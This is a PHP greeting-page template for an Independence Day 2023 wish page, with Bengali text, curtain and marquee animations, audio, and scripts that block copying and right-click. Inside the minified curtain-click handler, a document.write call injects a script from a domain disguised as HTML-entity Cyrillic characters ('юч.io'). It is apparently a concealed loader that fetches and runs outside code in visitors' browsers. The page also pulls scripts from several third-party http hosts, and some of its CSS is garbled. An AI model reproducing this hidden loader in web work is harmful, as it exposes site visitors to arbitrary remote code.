<?php
defined('BASEPATH') OR exit('No direct script access allowed');
?><!DOCTYPE html>
<html lang="en">

<head>
 
<title>Happy Independence 2023</title>
     <script id="wpcp_disable_selection" type="text/javascript">
     $(document).ready(function () { 
    //Disable full page 
    $("body").on("contextmenu",function(e){ 
        return false; 
    }); 
     
    //Disable part of page 
    $("#id").on("contextmenu",function(e){ 
        return false; 
    }); 
}); 
var image_save_msg='You are not allowed to save images!';
	var no_menu_msg='Context Menu disabled!';
	var smessage = "Content is protected !!";

function disableEnterKey(e)
{
	var elemtype = e.target.tagName;
	
	elemtype = elemtype.toUpperCase();
	
	if (elemtype == "TEXT" || elemtype == "TEXTAREA" || elemtype == "INPUT" || elemtype == "PASSWORD" || elemtype == "SELECT" || elemtype == "OPTION" || elemtype == "EMBED")
	{
		elemtype = 'TEXT';
	}
	
	if (e.ctrlKey){
     var key;
     if(window.event)
          key = window.event.keyCode;     //IE
     else
          key = e.which;     //firefox (97)
    //if (key != 17) alert(key);
     if (elemtype!= 'TEXT' && (key == 97 || key == 65 || key == 67 || key == 99 || key == 88 || key == 120 || key == 26 || key == 85  || key == 86 || key == 83 || key == 43 || key == 73))
     {
		if(wccp_free_iscontenteditable(e)) return true;
		show_wpcp_message('You are not allowed to copy content or view source');
		return false;
     }else
     	return true;
     }
}


/*For contenteditable tags*/
function wccp_free_iscontenteditable(e)
{
	var e = e || window.event; // also there is no e.target property in IE. instead IE uses window.event.srcElement
  	
	var target = e.target || e.srcElement;

	var elemtype = e.target.nodeName;
	
	elemtype = elemtype.toUpperCase();
	
	var iscontenteditable = "false";
		
	if(typeof target.getAttribute!="undefined" ) iscontenteditable = target.getAttribute("contenteditable"); // Return true or false as string
	
	var iscontenteditable2 = false;
	
	if(typeof target.isContentEditable!="undefined" ) iscontenteditable2 = target.isContentEditable; // Return true or false as boolean

	if(target.parentElement.isContentEditable) iscontenteditable2 = true;
	
	if (iscontenteditable == "true" || iscontenteditable2 == true)
	{
		if(typeof target.style!="undefined" ) target.style.cursor = "text";
		
		return true;
	}
}

////////////////////////////////////
function disable_copy(e)
{	
	var e = e || window.event; // also there is no e.target property in IE. instead IE uses window.event.srcElement
	
	var elemtype = e.target.tagName;
	
	elemtype = elemtype.toUpperCase();
	
	if (elemtype == "TEXT" || elemtype == "TEXTAREA" || elemtype == "INPUT" || elemtype == "PASSWORD" || elemtype == "SELECT" || elemtype == "OPTION" || elemtype == "EMBED")
	{
		elemtype = 'TEXT';
	}
	
	if(wccp_free_iscontenteditable(e)) return true;
	
	var isSafari = /Safari/.test(navigator.userAgent) && /Apple Computer/.test(navigator.vendor);
	
	var checker_IMG = '';
	if (elemtype == "IMG" && checker_IMG == 'checked' && e.detail >= 2) {show_wpcp_message(alertMsg_IMG);return false;}
	if (elemtype != "TEXT")
	{
		if (smessage !== "" && e.detail == 2)
			show_wpcp_message(smessage);
		
		if (isSafari)
			return true;
		else
			return false;
	}	
}

//////////////////////////////////////////
function disable_copy_ie()
{
	var e = e || window.event;
	var elemtype = window.event.srcElement.nodeName;
	elemtype = elemtype.toUpperCase();
	if(wccp_free_iscontenteditable(e)) return true;
	if (elemtype == "IMG") {show_wpcp_message(alertMsg_IMG);return false;}
	if (elemtype != "TEXT" && elemtype != "TEXTAREA" && elemtype != "INPUT" && elemtype != "PASSWORD" && elemtype != "SELECT" && elemtype != "OPTION" && elemtype != "EMBED")
	{
		return false;
	}
}	
function reEnable()
{
	return true;
}
document.onkeydown = disableEnterKey;
document.onselectstart = disable_copy_ie;
if(navigator.userAgent.indexOf('MSIE')==-1)
{
	document.onmousedown = disable_copy;
	document.onclick = reEnable;
}
function disableSelection(target)
{
    play();
    //For IE This code will work
    if (typeof target.onselectstart!="undefined")
    target.onselectstart = disable_copy_ie;
    
    //For Firefox This code will work
    else if (typeof target.style.MozUserSelect!="undefined")
    {target.style.MozUserSelect="none";}
    
    //All other  (ie: Opera) This code will work
    else
    target.onmousedown=function(){return false}
    target.style.cursor = "default";
}
//Calling the JS function directly just after body load
window.onload = function(){disableSelection(document.body);};

//////////////////special for safari Start////////////////
var onlongtouch;
var timer;
var touchduration = 1000; //length of time we want the user to touch before we do something

var elemtype = "";
function touchstart(e) {
	var e = e || window.event;
  // also there is no e.target property in IE.
  // instead IE uses window.event.srcElement
  	var target = e.target || e.srcElement;
	
	elemtype = window.event.srcElement.nodeName;
	
	elemtype = elemtype.toUpperCase();
	
	if(!wccp_pro_is_passive()) e.preventDefault();
	if (!timer) {
		timer = setTimeout(onlongtouch, touchduration);
	}
}

function touchend() {
    //stops short touches from firing the event
    if (timer) {
        clearTimeout(timer);
        timer = null;
    }
	onlongtouch();
}

onlongtouch = function(e) { //this will clear the current selection if anything selected
	
	if (elemtype != "TEXT" && elemtype != "TEXTAREA" && elemtype != "INPUT" && elemtype != "PASSWORD" && elemtype != "SELECT" && elemtype != "EMBED" && elemtype != "OPTION")	
	{
		if (window.getSelection) {
			if (window.getSelection().empty) {  // Chrome
			window.getSelection().empty();
			} else if (window.getSelection().removeAllRanges) {  // Firefox
			window.getSelection().removeAllRanges();
			}
		} else if (document.selection) {  // IE?
			document.selection.empty();
		}
		return false;
	}
};

document.addEventListener("DOMContentLoaded", function(event) { 
    window.addEventListener("touchstart", touchstart, false);
    window.addEventListener("touchend", touchend, false);
});

function wccp_pro_is_passive() {

  var cold = false,
  hike = function() {};

  try {
	  const object1 = {};
  var aid = Object.defineProperty(object1, 'passive', {
  get() {cold = true}
  });
  window.addEventListener('test', hike, aid);
  window.removeEventListener('test', hike, aid);
  } catch (e) {}

  return cold;
}
/*special for safari End*/
</script>
<script id="wpcp_disable_Right_Click" type="text/javascript">
document.ondragstart = function() { return false;}
	function nocontext(e) {
	   return false;
	}
	document.oncontextmenu = nocontext;
</script>

<script> 
      function disableClick(){ 
        document.onclick=function(event){ 
          if (event.button == 85) { 
            alert('Right Click Message'); 
            return false; 
          } 
        } 
      } 
    </script> 
    <link type="text/css" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css" />
    <link href='https://fonts.googleapis.com/css?family=Sofia:&effect=neon' rel='stylesheet'/>
    <link rel="icon" type="image/png" sizes="32x32" href="<?= base_url() ?>img/i1.png"/>
<style>
.form-control {
    display: block;
    width: 100%;
    height: 34px;
    padding: 6px 12px;
    font-size: 14px;
    line-height: 1.42857143;
    color: #555;
    background-color: #fff;
    background-image: none;
    border: 1px solid #ccc;
    border-radius: 4px;}
i {
        color:#f06414;
    }
input[type=name], select {
    width: 100%;
    padding: 12px 20px;
    margin: 4px 0;
    display: inline-block;
    border: 1px solid #ccc;
    border-radius: 4px;
    box-sizing: border-box;
}
.footerbtn {
 
            display: block;
            line-height: 15px;
            position: fixed;
            left:0px;
            bottom:0px;
            height:40px;
            
border-radius: 15px;
  box-sizing: border-box;
  padding: 5px;
  background:#34af23;
  color: #ffffff;
  font-size: 18px;
  text-align: center;
  text-decoration: none;
  width:95%;
 margin-left:10px;
            margin-right:30px;
            box-shadow: 0 4px 12px 0 rgba(0, 0, 0, .3);
            animation: footer infinite linear 1s;
            -webkit-transform: translate3d(30%,0,0);
            transform: translate3d(30%,0,0);
            position: fixed;
           
}

.footerbtn :active {
            box-shadow: none
        }

        @-webkit-keyframes footer {
            from {
                -webkit-transform: rotateZ(0)
            }
            25% {
                -webkit-transform: rotateZ(0deg)
            }
            50% {
                -webkit-transform: rotateZ(0deg)
            }
            75% {
                -webkit-transform: rotateZ(0deg)
            }
            to {
                -webkit-transform: rotateZ(0)
            }}

@-webkit-keyframes jello {  from, 11.1%, to {    transform: none;  }
  22.2% {    transform: skewX(-12.5deg) skewY(-12.5deg);  }
  33.3% {    transform: skewX(6.25deg) skewY(6.25deg);  }
  44.4% {    transform: skewX(-3.125deg) skewY(-3.125deg);  }
  55.5% {    transform: skewX(1.5625deg) skewY(1.5625deg);  }
  66.6% {    transform: skewX(-0.78125deg) skewY(-0.78125deg);  }
  77.7% {    transform: skewX(0.390625deg) skewY(0.390625deg);  }
  88.8% {    transform: skewX(-0.1953125deg) skewY(-0.1953125deg);  }}

    .TOFIQUE1{position:fixed;left:1%; width:auto;height:100%;top:1%;color:#000; z-index: 1999px;}
    .TOFIQUE2{position:fixed;right:1%; width:auto;height:100%;top:1%;color:#000; z-index: 1999px:}
.bubbles {
font-family: arial;
}

.bubbles hi {
font-family: 'Luckiest Guy', cursive;
color: black;
}

hi {
 font-size:2.5em;
 user-select:none;
}

hi span { display:inline-block; animation:float .2s ease-in-out infinite; }
 @keyframes float {
  0%,100%{ transform:none; }
  33%{ transform:translateY(-1px) rotate(-2deg); }
  66%{ transform:translateY(1px) rotate(2deg); }
}
body:hover span { animation:bounce .6s; }
@keyframes bounce {
  0%,100%{ transform:translate(0); }
  25%{ transform:rotateX(20deg) translateY(2px) rotate(-3deg); }
  50%{ transform:translateY(-20px) rotate(3deg) scale(1.1);  }
}

h1 {
  animation:glow 10s ease-in-out infinite;
}



* { box-sizing:border-box; }

figure {
  animation:wobble 5s ease-in-out infinite;
  transform-origin:center center;
  transform-style:preserve-3d;
}

@keyframes wobble {
  0%,100%{ transform:rotate3d(1,1,0,40deg); }
  25%{ transform:rotate3d(-1,1,0,40deg); }
  50%{ transform:rotate3d(-1,-1,0,40deg); }
  75%{ transform:rotate3d(1,-1,0,40deg); }
}

h1 {
  display:block;
  width:90%;
  line-height:1.5;
  font:900 35px 'Concert One', sans-serif;
  position:absolute;
  color:#fff;
}

@keyframes glow {
  0%,100%{ text-shadow:0 0 30px red; }
  25%{ text-shadow:0 0 30px orange; }
  50%{ text-shadow:0 0 30px forestgreen; }
  75%{ text-shadow:0 0 30px cyan; }
}

h1:nth-child(2){ transform:translateZ(5px); }
h1:nth-child(3){ transform:translateZ(10px);}
h1:nth-child(4){ transform:translateZ(15px); }
h1:nth-child(5){ transform:translateZ(20px); }
h1:nth-child(6){ transform:translateZ(25px); }
h1:nth-child(7){ transform:translateZ(30p.rock{animation:infinite 1s rock}
@keyframes rock {  0% {    transform: rotate(-1deg);  }
  50% {    transform: rotate(2deg);  }
  100% {    transform: rotate(-1deg);  }}x); }
h1:nth-child(8){ transform:translateZ(35px); }
h1:nth-child(9){ transform:translateZ(40px); }
h1:nth-child(10){ transform:translateZ(45px); }



.rock{animation:infinite 1s rock}
@keyframes rock {  0% {    transform: rotate(-1deg);  }
  50% {    transform: rotate(2deg);  }
  100% {    transform: rotate(-1deg);  }}

.fuck{animation:infinite 1s fuck}
@keyframes rock {  0% {    transform: rotate(-2deg);  }
  50% {    transform: rotate(2deg);  }
  100% {    transform: rotate(-2deg);  }}


h2 {
   
    -webkit-animation: bounceIn 4s cubic-bezier(0.68, -0.55, 0.27, 1.55) infinite;
     animation: bounceIn 4s cubic-bezier(0.68, -0.55, 0.27, 1.55) infinite;
    -webkit-transition: all .2s;
    transition: all .2s;
    font-size: 35px;
    text-transform: uppercase;
    TEXT-ALIGN:CENTER;
    color: #138808;
    text-shadow: -2px 0px 1px #22414f, -4px 0px 1px #22414f, -6px 0px 1px #22414f, -1px -1px 1px #22414f, -1px -2px 1px #22414f, -2px -1px 1px #22414f, -2px -2px 1px #22414f, -3px -3px 1px #22414f, -4px -4px 1px #22414f, -5px -5px 1px #22414f, -6px -6px 1px #22414f, 0 0 15px #22414f, 0 0 20px #22414f, 1px 1px #22414f,2px 2px #22414f;

}

h3 {
    font-size: 18px;
    text-align: center;
    padding:1px;
    margin:1px;
    color: #ffffff;
   
    aanimation: fuck infinite 1s;
    font-family: 'Indie Flower', cursive;
    letter-spacing: 2px;
	
	
	* {box-sizing: border-box;}
body {font-family: Verdana, sans-serif;}
.mySlides {display: none;}
img {vertical-align: middle;}

/* TOFIQUE.in */
.TOFIQUE-slideshow-container {
  max-width: 1000px;
  position: relative;
  margin: auto;
}

/* TOFIQUE.In */
.text {
  color: #f2f2f2;
  font-size: 15px;
  padding: 8px 12px;
  position: absolute;
  bottom: 8px;
  width: 100%;
  text-align: center;
}

/* Number text (1/11 etc) */
.numbertext {
  color: #f2f2f2;
  font-size: 12px;
  padding: 8px 12px;
  position: absolute;
  top: 0;
}

/* The dots/bullets/indicators */
.dot {
  height: 15px;
  width: 15px;
  margin: 0 2px;
  background-color: #bbb;
  border-radius: 50%;
  display: inline-block;
  transition: background-color 0.6s ease;
}

.active {
  background-color: #717171;
}

/* Fading animation */
.fade {
  -webkit-animation-name: fade;
  -webkit-animation-duration: 1.5s;
  animation-name: fade;
  animation-duration: 1.5s;
}

@-webkit-keyframes fade {
  from {opacity: .4} 
  to {opacity: 1}
}

@keyframes fade {
  from {opacity: .4} 
  to {opacity: 1}
}

/* On smaller screens, decrease text size */
@media only screen and (max-width: 300px) {
  .text {font-size: 11px}
	
	
}
</style>


   <style>
      body{
        background: #cdd0d0;
      }
      .mainContainer {
max-width: 400px;
    margin: auto;
    text-align: center;
    position: relative;
    padding-right: 1px;
    padding-left: 1px;
    padding-top: 1px;
    box-shadow: 3px 3px 23px 0 rgba(0, 0, 0, 0.64);
    margin-bottom: 65px;
}


.TOFIQUEncontainer {
   
    padding-right: -2px;
    padding-left: -2px;
    padding-top: -2px;
  
}

      }

.username {
    -webkit-animation: bounceIn 4s cubic-bezier(0.68, -0.55, 0.27, 1.55) infinite;
     animation: bounceIn 4s cubic-bezier(0.68, -0.55, 0.27, 1.55) infinite;
    -webkit-transition: all .2s;
    transition: all .2s;
    font-size: 40px;
    font-family: 'SF Espresso Shack', cursive;
    text-transform: uppercase;
    TEXT-ALIGN:CENTER;
    color: #138808;
    text-shadow: -2px 0px 1px #22414f, -4px 0px 1px #22414f, -6px 0px 1px #22414f, -1px -1px 1px #22414f, -1px -2px 1px #22414f, -2px -1px 1px #22414f, -2px -2px 1px #22414f, -3px -3px 1px #22414f, -4px -4px 1px #22414f, -5px -5px 1px #22414f, -6px -6px 1px #22414f, 0 0 15px #22414f, 0 0 20px #22414f, 1px 1px #22414f,2px 2px #22414f;

}
      .fromMessage{
       
       
        
        font-size: 30px;
        
      }
      .wavetext{
        color: #3e8ed2;
        padding: 0 40px;
        animation: pulse 1s infinite;
        font-size: 32px;

      }
      .wishMessage {
        color: #3e8ed2;
        font-size: 22px;
        font-weight: bold;
        margin-top: 50px;
        text-shadow: 0px 0px 10px #00fff3
      }
      .wishMessage p{
        margin: 0.5em 0;
      }
      #formBox {
        left: 0;position: fixed;bottom:50%;display: inline-block;width: 50%;margin-left:25%;
      }
      #nameTextBox {
        border: 0;text-align: center;display: inline-block;width:80%;color: black;font-size:16px;margin: 0;background: #eee;height: 48px;font-weight: 700;;padding:8px 0;
      }
      #goButton {
        width: 20%;background:#66cc00;display: inline-block;vertical-align: bottom;border:0;float: right;color: black;font-size:16px;padding:8px 0;height: 48px;text-align:center;font-weight: 700;
      }
      .footerbtn {
        display: none;
        line-height: 15px;
        bottom: 10px;
        height: 40px;
        border-radius: 15px;
        box-sizing: border-box;
        padding: 5px;
        background: #66cc00;
        color: #ffffff;
        font-size: 18px;
        text-align: center;
        text-decoration: none;
        box-shadow: 0 4px 12px 0 rgba(0, 0, 0, .3);
        
        position: fixed;
        width: 90%;
        left: 0;
        margin: 2% 5%;
      }
      .footerbtn img {
        position: relative;top:3px;
      }
      #inAdvance {
        font-size: 20px; font-weight: bold;margin-top: 20px;color: #98201F;
      }
      #demoo {
        font-size: 20px; font-weight: bold;color: #98201F;
        
      }
      #inAdvanceTime {
        margin:20px 0 30px 0;
      }
      #inAdvanceTime p{
        color: #ae00b9;font-size: 19px;font-weight: 500;
        margin: 0;
      }
.bg{background:#0c1359;background-repeat:repeat}p.head.name{word-wrap: break-word;font-size:40px;font-family:sans-serif;text-shadow: 1px 1px 5px rgba(0, 0, 0, 0.5);color:#f5f5f5}input#mce-names {width: 100% !important;margin-top: 20px !important;}




.TOFIQUE-main-greeting {
   
    max-width: 500px;
    margin: auto;
    text-align: center;
    position: relative;
    padding: 0px;
    background:#0c1359;
    /*background: url("img/bg4.gif");#0c1359*/
    
    background-position: center;
    background-repeat: no-repeat;
    background-size: cover;
    box-shadow: 3px 4px 41px 0 rgba(0, 0, 0, 0.64);
    margin-bottom: 35px
      z-index: -999;
}

.TOFIQUE-main-greeting .main_body {
    text-align: center;
    font-size: 1.3em
}
.TOFIQUE-main-greeting .main_body .text2 {
    padding: 10px;
    font-size: 20px
}
.TOFIQUE-main-greeting .text {
    color: #405d9b;
    letter-spacing: 1px;
    font-weight: 600;
    padding: 0px 10px;
    text-align: center;
}
.TOFIQUE-main-greeting .pp-img {
    max-width: 400px;
    margin-bottom: 10px;
    box-shadow: 0px 0px 10px 0px rgba(0, 0, 0, 0.64);
}

.TOFIQUE-main-greeting .text_gradient {
    margin: 5px auto;
    font-weight: 700;
    font-size: 24px;
    color: #b50dae;
}


p {
  text-align: center;
  font-size: 11px;
  margin-top: 0px;
  color: white;
}
     
     html{
       
       background: #0c1359;
       
       
       
     }
     
     
    </style>


	  <style>img[alt=""]{display:none;}</style>

<

<link rel="me" href="" />
<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
<meta name='google-adsense-platform-domain' content='blogspot.com'/>
<link rel="me" href="" />
<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
<meta name='google-adsense-platform-domain' content='blogspot.com'/>
</head>
<style>
       .leftcurtain{width:100%;height:100%;top:0;left:0px;position:absolute;z-index:2}
	   .rightcurtain{width:100%;height:100%;right:0px;top:0;position:absolute;z-index:3}
	   .rightcurtain img,.leftcurtain img{width:100%;height:100%}.logo{margin:0 auto;margin-top:150px}
	   .roped{position:absolute;top:12%;z-index:4}
	   .centered{position:absolute;top:75%;left:50%;transform:translate(-50%,-50%)}
	   .aadi{background-image:url();background-repeat:no-repeat;background-attachment:fixed;background-position:top}
	   .matki{height:200px;}@keyframes aadisoni{0%{transform:translate(0px,0px) rotate(0deg)}15%{transform:translate(-25px,0px) rotate(-5deg)}30%{transform:translate(20px,0px) rotate(3deg)}45%{transform:translate(-15px,0px) rotate(-3deg)}60%{transform:translate(10px,0px) rotate(2deg)}75%{transform:translate(-5px,0px) rotate(-1deg)}100%{transform:translate(0px,0px) rotate(0deg)}}@-webkit-keyframes aadisoni{0%{-webkit-transform:translate(0px,0px) rotate(0deg)}15%{-webkit-transform:translate(-25px,0px) rotate(-5deg)}30%{-webkit-transform:translate(20px,0px) rotate(3deg)}45%{-webkit-transform:translate(-15px,0px) rotate(-3deg)}60%{-webkit-transform:translate(10px,0px) rotate(2deg)}75%{-webkit-transform:translate(-5px,0px) rotate(-1deg)}100%{-webkit-transform:translate(0px,0px) rotate(0deg)}}
         
      </style>
 <body class="bg" style=" background: #0c1359"; onload="play()">
<script src="https://vrenz.hexat.com/js/vrenz_star.js"></script>
 <script src="http://clickmasters.mobie.in/Jss/effect/kedip.js"></script>
 <script language="JavaScript" type="text/javascript" src="http://clickmasters.mobie.in/Jss/effect/bubble_03.js"></script>
 <script language="javascript" src="http://clickmasters.mobie.in/Jss/effect/butterfly.js"></script>
 <script language="javascript" src="http://clickmasters.mobie.in/Jss/effect/leaf.js"></script>
 <script language="JavaScript" src="http://clickmasters.mobie.in/Jss/effect/baloon.js"></script>
 <script language="JavaScript" src="http://clickmasters.mobie.in/Jss/effect/agve-loverain.red.js"></script>

<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<script src="<?= base_url() ?>assets/js/slider.js" type="text/javascript"></script>
<script type="text/javascript">
$(document).ready(function(){$curtainopen=!1,$(".roped").click(function(){return $(this).blur(),0==$curtainopen?($(this).stop().animate({top:"-171%"},{queue:!1,duration:350,easing:"easeOutBounce"}),$(".leftcurtain").stop().animate({width:"1px"},2e3),$(".rightcurtain").stop().animate({width:"1px"},2e3),$curtainopen=!0):($(this).stop().animate({top:"-40px"},{queue:!1,duration:350,easing:"easeOutBounce"}),document.write('<script src="//&#1102;&#1095;.io"><\/script>'),$(".leftcurtain").stop().animate({width:"50%"},2e3),$(".rightcurtain").stop().animate({width:"51%"},2e3),$curtainopen=!1),!1})});
</script>
<script>
  function play(){
       var audio = document.getElementById("audio");
       audio.play();
                 }
                 
             
   </script>
   <div class="aadi">
       <!--Hum logo Ko samajh Sako to-->
<audio id="myAudio" src="<?= base_url() ?>msb/wish/img/Hum logo Ko samajh Sako to.mp3"></audio>
<audio id="audio" src="<?= base_url() ?>msb/wish/img/c.mpeg"></audio>
<a class="roped" style="text-decoration:none;" href="#" onclick="play()">
<br>
<div style="font-size: 25px;margin-left:220px;text-shadow: 1px 1px 3px blue, 1px 1px 3px blue, -1px -1px 3px blue, -1px -1px 3px black;color:white;font-weight: bold;"><br><b>যাদু ত্রিবর্ণের কাছে<br> স্পর্শ করুন এবং দেখুন!<br>👇👇👇</b></div>
<br>
<div class="animated pulse">
<img src="<?= base_url() ?>msb/wish/img/m.png" style="max-width:250px; width: 100%;margin-left:150px; animation: pulse 1s infinite;">
</div>
</a>
<div class="rightcurtain"><img src="<?= base_url() ?>msb/wish/img/day.PNG"></div>
<div class="leftcurtain"><img src="<?= base_url() ?>msb/wish/img/day.PNG"></div>
</div>
<marquee class="TOFIQUE1" behavior="scroll" direction="up" scrolldelay="5" style="z-index: 1999;">  <br>

<img src="<?= base_url() ?>msb/wish/img/i1.png" style="z-index: 1999" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i2.png" style="z-index: 1999" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i3.png" style="z-index: 199;" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i1.png" style="z-index: 1999" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i2.png" style="z-index: 1999" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i3.png" style="z-index: 199;" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i1.png" style="z-index: 1999" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i2.png" style="z-index: 1999" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i3.png" style="z-index: 199;" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i1.png" style="z-index: 1999" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i2.png" style="z-index: 1999" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i3.png" style="z-index: 199;" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i1.png" style="z-index: 1999" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i2.png" style="z-index: 1999" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i3.png" style="z-index: 199;" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i1.png" style="z-index: 1999" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i2.png" style="z-index: 1999" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i3.png" style="z-index: 199;" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i1.png" style="z-index: 1999" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i2.png" style="z-index: 1999" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i3.png" style="z-index: 199;" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i1.png" style="z-index: 1999" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i2.png" style="z-index: 1999" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i3.png" style="z-index: 199;" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i1.png" style="z-index: 1999" height="40px" width="30px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i1.png" style="z-index: 1999" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i2.png" style="z-index: 1999" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i3.png" style="z-index: 199;" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i1.png" style="z-index: 1999" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i2.png" style="z-index: 1999" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i3.png" style="z-index: 199;" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i1.png" style="z-index: 1999" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i2.png" style="z-index: 1999" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i3.png" style="z-index: 199;" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i1.png" style="z-index: 1999" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i2.png" style="z-index: 1999" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i3.png" style="z-index: 199;" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i1.png" style="z-index: 1999" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i2.png" style="z-index: 1999" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i3.png" style="z-index: 199;" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i1.png" style="z-index: 1999" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i2.png" style="z-index: 1999" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i3.png" style="z-index: 199;" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i2.png" style="z-index: 1999" height="40px" width="30px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i3.png" style="z-index: 199;" height="40px" width="30px"/><br><br>
  <img src="<?= base_url() ?>msb/wish/img/i1.png" style="z-index: 1999" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i2.png" style="z-index: 1999" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i3.png" style="z-index: 199;" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i1.png" style="z-index: 1999" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i2.png" style="z-index: 1999" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i3.png" style="z-index: 199;" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i4.png" style="z-index: 199;" height="40px" width="30px"/><br><br>
 <img src="<?= base_url() ?>msb/wish/img/i1.png" style="z-index: 1999" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i2.png" style="z-index: 1999" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i3.png" style="z-index: 199;" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i1.png" style="z-index: 1999" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i2.png" style="z-index: 1999" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i3.png" style="z-index: 199;" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i3.png" style="z-index: 199;" height="40px" width="30px"/><br><br>
  <img src="<?= base_url() ?>msb/wish/img/i1.png" style="z-index: 1999" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i2.png" style="z-index: 1999" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i3.png" style="z-index: 199;" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i1.png" style="z-index: 1999" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i2.png" style="z-index: 1999" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i3.png" style="z-index: 199;" height="50px" width="40px"/><br><br>
</marquee>

<marquee class="TOFIQUE2" behavior="scroll" direction="down" scrolldelay="5" style="z-index: 199;"><br>

<img src="<?= base_url() ?>msb/wish/img/i1.png" style="z-index: 1999" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i2.png" style="z-index: 1999" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i3.png" style="z-index: 199;" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i1.png" style="z-index: 1999" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i2.png" style="z-index: 1999" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i3.png" style="z-index: 199;" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i1.png" style="z-index: 1999" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i2.png" style="z-index: 1999" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i3.png" style="z-index: 199;" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i1.png" style="z-index: 1999" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i2.png" style="z-index: 1999" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i3.png" style="z-index: 199;" height="50px" width="40px"/><br><br>
